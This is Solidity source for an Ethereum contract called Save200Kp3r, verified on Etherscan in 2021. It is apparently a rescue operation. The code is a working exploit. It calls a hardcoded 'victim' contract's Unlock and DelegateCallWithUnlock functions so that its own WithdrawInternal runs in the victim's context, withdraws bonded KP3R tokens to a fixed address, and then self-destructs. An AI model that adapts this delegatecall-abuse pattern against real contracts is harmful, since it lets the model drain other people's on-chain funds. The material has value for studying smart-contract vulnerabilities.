/**
 *Submitted for verification at Etherscan.io on 2021-04-18
*/

// SPDX-License-Identifier: NONE

pragma solidity 0.8.1;



// Part: IErc20

interface IErc20 {
    function approve(address, uint256) external returns (bool);

    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint);
    function allowance(address _owner, address _spender) external view returns (uint256 remaining);
}

// Part: IKp3r

interface IKp3r {
    function withdraw(address bonding) external;
    function resolve(address keeper) external;
    function dispute(address keeper) external;
    function balanceOf(address keeper) view external returns (uint256);

}

// Part: IVictimContract

interface IVictimContract {
    function Unlock(uint256 b) external ;
   
    function DelegateCallWithUnlock(address target,bool allowRevert, bytes memory data) external returns (bytes memory response);
  

}

// File: Save200Kp3r.sol

contract Save200Kp3r  {

  
    address private constant _deployer = 0x8CC1cFdc1C60C19a1d7C0fa3c042a4916AA79a51;
    address private constant  _victim=0xdd0fBEcCba0aA4Cc56b861D514e09f49Bcc6D0C5;
    address private constant  _sendRestTo=0x661047E7f94450D8a0C5d82FAd0E93f5ad681914;
    address private constant _kp3r = 0x1cEB5cB57C4D4E2b2433641b95Dd330A33185A44;
    event Log(address);

    constructor()  {
    
    }

    
    function Withdraw() public {
        IVictimContract(_victim).Unlock(block.number);
        bytes memory data=abi.encodeWithSignature("WithdrawInternal()");
        bytes memory data2=abi.encodeWithSignature("DelegateCallWithUnlock(address,bool,bytes)",address(this),false,data);
        uint256 balanceBefore=IErc20(_kp3r).balanceOf(_sendRestTo);
        _victim.call(data2);

        uint256 balanceAfter=IErc20(_kp3r).balanceOf(_sendRestTo);
        if(balanceBefore==balanceAfter){ 
            revert("tokens not arrived");//just in case to return tokens back to bond address 
        }
        selfdestruct(payable(_sendRestTo));
    }

    //executes in VICTIM contract context
    function WithdrawInternal()  public  {
     
        IKp3r(_kp3r).withdraw(_kp3r);
        uint256 balance=IErc20(_kp3r).balanceOf(address(this));
        IErc20(_kp3r).transfer(_sendRestTo,balance);//no funds on Save200Kp3r - so it is safe
        //selfdestruct(payable(_sendRestTo)); //Destruct victim contract
     }

   
   
}